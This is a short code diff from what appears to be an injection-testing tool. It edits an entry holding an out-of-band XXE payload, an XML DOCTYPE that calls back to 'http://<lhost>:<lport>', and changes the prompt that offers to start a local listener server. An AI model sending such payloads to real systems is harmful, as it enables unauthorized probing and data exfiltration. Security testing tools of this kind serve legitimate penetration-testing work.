@@ -27,14 +27,18 @@ arrayInjection.push({
 	sample: "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE foo PUBLIC 'bar' 'http://<lhost>:<lport>'>",
 	category: "XML",
 	callback: function(returnToPrepare){
-		prompt.message = "Would you like to start a server?"
+		prompt.message = "Bro, should I fire up a web server for you? (Y/n)"
 
 		prompt.get([{name: '_', description: ':'}], function(err, result){
-			var server = web.init(returnToPrepare)
-			prompt.message = "Press any key to exit"
+			result._ = result._.toUpperCase()
+			if (result._ === "Y"){
+				var server = web.init(returnToPrepare)
+			}
+			else {
+				returnToPrepare(result._)
+			}
+			
 		})
-
-		//var server = web.init()
 	}
 })
 
